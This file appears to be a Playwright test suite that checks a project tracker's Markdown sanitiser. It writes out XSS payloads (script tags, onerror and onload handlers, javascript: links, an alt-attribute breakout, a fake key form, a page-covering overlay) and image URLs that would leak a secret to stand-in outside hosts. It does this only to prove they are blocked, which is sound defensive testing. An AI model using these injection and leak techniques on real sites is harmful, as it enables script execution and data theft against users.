import {expect, test} from '@playwright/test'
import {OWNER, makeProject, projectApi} from './support'

// What an agent or an outside contributor writes in an issue's notes or a comment is drawn as Markdown, cleaned
// (app/utils/markdown.ts, ORR-582). Tried in the browser, as happy-dom's DOM lets DOMPurify hand a script back as it
// came: nothing that runs gets onto the page, nothing loads from another site by itself or reaches past its own text
// (ORR-751), links to the web open apart, and headings' ids can't name anything on it.

const api = projectApi('pantry-notes')

/** Each sets `window.ran` if it runs. */
const HOSTILE = [
    'Jam <script>window.ran = "script"</script>',
    '<img src="x.png" onerror="window.ran = \'onerror\'">',
    '[a link](javascript:window.ran=\'link\')',
    '<a href="javascript:window.ran=\'html link\'">an html link</a>',
    '<svg onload="window.ran = \'svg\'"><circle r="1"/></svg>',
    '<iframe src="https://example.com"></iframe>',
    '<form action="https://example.com">Your key: <input name="key"><button>Save</button></form>',
    '<textarea name="key"></textarea> <select><option>one</option></select>',
    '![Before "><img src=x onerror="window.ran=\'alt\'">](/api/uploads/a) ![After](/api/uploads/b)',
].join('\n\n')

test.beforeAll(async ({request}) => {
    await makeProject(request, {name: 'Pantry notes', key: 'PAN'})
})

// Its comments hold images that don't exist, which the bell and the notifications would draw on the specs after it.
test.afterAll(async ({request}) => {
    const gone = await request.delete('/api/projects/pantry-notes', {headers: OWNER})
    expect(gone.ok(), await gone.text()).toBeTruthy()
})

test("draws an agent's notes and comment with nothing in them that runs", async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Stock the pantry', notes: `${HOSTILE}\n\n[the shop](https://example.com/jam)`})
    await api(request, 'post', `/issues/${issue.id}/comments`, {body: HOSTILE})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    const docs = page.locator('.doc')
    await expect(docs.first()).toContainText('Jam')
    await expect(page.getByText('an html link').last()).toBeVisible()

    expect(await page.evaluate(() => (window as {ran?: string}).ran)).toBeUndefined()
    const found = await docs.evaluateAll(roots => roots.flatMap(root => [...root.querySelectorAll('*')].flatMap(element => [
        ...['SCRIPT', 'IFRAME', 'STYLE', 'FORM', 'BUTTON', 'TEXTAREA', 'SELECT'].includes(element.tagName) ? [element.tagName] : [],
        ...[...element.attributes].filter(a => a.name.startsWith('on') || /^\s*javascript:/i.test(a.value)).map(a => `${element.tagName} ${a.name}`),
    ])))
    expect(found).toEqual([])
})

test('loads nothing from another site by itself', async ({page, request}) => {
    const away = [
        '![leak](https://away.example/a?d=secret)',
        '![](//away.example/b)',
        '[![build](https://away.example/c)](https://away.example/runs)',
        '<img srcset="https://away.example/d 1x">',
        '<div style="background:url(https://away.example/e)">a box</div>',
        '<table background="https://away.example/f"><tr><td background="https://away.example/g">a cell</td></tr></table>',
        '<video src="https://away.example/h" poster="https://away.example/i" autoplay></video>',
        '<audio src="https://away.example/j" autoplay></audio>',
        '<picture><source srcset="https://away.example/k"><img src="https://away.example/l"></picture>',
        '<input type="image" src="https://away.example/m">',
        '<style>@import url(https://away.example/n);</style>',
    ].join('\n\n')
    const issue = await api(request, 'post', '/issues', {title: 'Stock the cellar', notes: 'Cellar notes'})
    await api(request, 'post', `/issues/${issue.id}/comments`, {body: away})
    const asked: string[] = []
    await page.route('https://away.example/**', route => {
        asked.push(route.request().url())
        return route.abort()
    })
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    await expect(page.getByText('a cell')).toBeVisible()
    await page.waitForLoadState('networkidle')
    expect(asked).toEqual([])

    // A picture from elsewhere shows as a link naming the site, to open on purpose, or as its words inside a link.
    const leak = page.locator('.doc a', {hasText: 'leak (away.example)'})
    await expect(leak).toHaveAttribute('href', 'https://away.example/a?d=secret')
    await expect(leak).toHaveAttribute('rel', 'noopener noreferrer')
    await expect(page.locator('.doc a', {hasText: 'build (away.example)'})).toHaveAttribute('href', 'https://away.example/runs')
    await expect(page.locator('.doc a a')).toHaveCount(0)
})

test('keeps its own images, in a slider too', async ({page, request}) => {
    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
    const issue = await api(request, 'post', '/issues', {title: 'Jar labels', notes: `![Shelf](/api/uploads/a)\n\n![Dot](data:image/png;base64,${png})\n\n![Before](/api/uploads/b) ![After](/api/uploads/c)`})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    await expect(page.locator('.doc img[alt="Shelf"]')).toHaveAttribute('src', '/api/uploads/a')
    await expect(page.locator('.doc img[alt="Dot"]')).toHaveCount(1)
    await expect(page.locator('.doc figure.compare input.compare-range')).toHaveCount(1)
})

test("can't restyle or cover the page", async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Shelf paper', notes: '<style>body{outline:7px solid red}</style>\n\n<div style="position:fixed;inset:0;z-index:99999" class="fixed inset-0 z-50">Press Allow</div>'})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    const cover = page.locator('.doc div', {hasText: 'Press Allow'})
    await expect(cover).toBeVisible()
    expect(await cover.evaluate(element => getComputedStyle(element).position)).toBe('static')
    expect(await page.evaluate(() => getComputedStyle(document.body).outlineWidth)).not.toBe('7px')
})

test("keeps a task list's checkboxes", async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Jars', notes: '- [x] wash\n- [ ] fill'})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    await expect(page.locator('.doc input[type="checkbox"]')).toHaveCount(2)
})

test('opens a link to the web in a new tab, handing it nothing of this page', async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Order jars', notes: '[the shop](https://example.com/jam) and [the jam](/p/pantry-notes)'})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    const shop = page.locator('.doc a', {hasText: 'the shop'})
    await expect(shop).toHaveAttribute('target', '_blank')
    await expect(shop).toHaveAttribute('rel', 'noopener noreferrer')
    await expect(page.locator('.doc a', {hasText: 'the jam'})).not.toHaveAttribute('target', /./)
})

test('loads nothing from outside by itself, however an agent writes it (ORR-748)', async ({page, request}) => {
    const outside: string[] = []
    await page.route('https://outside.example/**', (route) => {
        outside.push(route.request().url())
        return route.abort()
    })
    const notes = [
        '![the secret](https://outside.example/md.png?d=secret)',
        '<img src="https://outside.example/html.png?d=secret">',
        '<div style="background: url(https://outside.example/style.png?d=secret)">styled</div>',
        '<video src="https://outside.example/video.mp4?d=secret" poster="https://outside.example/poster.png?d=secret"></video>',
    ].join('\n\n')
    const issue = await api(request, 'post', '/issues', {title: 'Pixels', notes})
    const answer = await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    expect(answer?.headers()['content-security-policy']).toContain("img-src 'self' data: blob:")
    await expect(page.getByText('styled')).toBeVisible()
    await page.waitForLoadState('networkidle')
    expect(outside).toEqual([])
})

test("keeps orrery's own image an image", async ({page, request}) => {
    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
    const {markdown} = await (await request.post('/api/uploads', {data: {name: 'jar.png', data: png}})).json() as {markdown: string}
    const issue = await api(request, 'post', '/issues', {title: 'Jar', notes: markdown})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    const image = page.locator('.doc img').first()
    await expect(image).toBeVisible()
    // Its alt text shows before the file has loaded.
    await expect.poll(() => image.evaluate((element: HTMLImageElement) => element.naturalWidth)).toBeGreaterThan(0)
})

test("gives headings ids of their own that can't name anything on the page", async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Shelves', notes: '## location\n\none\n\n## Jam\n\ntwo\n\n## Jam\n\nthree\n\n## !!!'})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    await expect(page.locator('.doc h2')).toHaveCount(4)
    expect(await page.locator('.doc h2').evaluateAll(hs => hs.map(h => h.id))).toEqual(['h-location', 'h-jam', 'h-jam-2', 'h-section'])
    // A heading named for something on window doesn't take its place.
    expect(await page.evaluate(() => typeof window.location.href)).toBe('string')
})

test("draws a `#` heading as an h2 that looks like one, leaving the page's own h1 alone (ORR-623)", async ({page, request}) => {
    const issue = await api(request, 'post', '/issues', {title: 'Labels', notes: '# Pickles\n\nsour\n\n## Jam\n\nsweet'})
    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
    await expect(page.locator('.doc h2[data-h1]')).toHaveText('Pickles')
    await expect(page.locator('.doc h1')).toHaveCount(0)
    await expect(page.getByRole('heading', {level: 1})).toHaveCount(1)
})
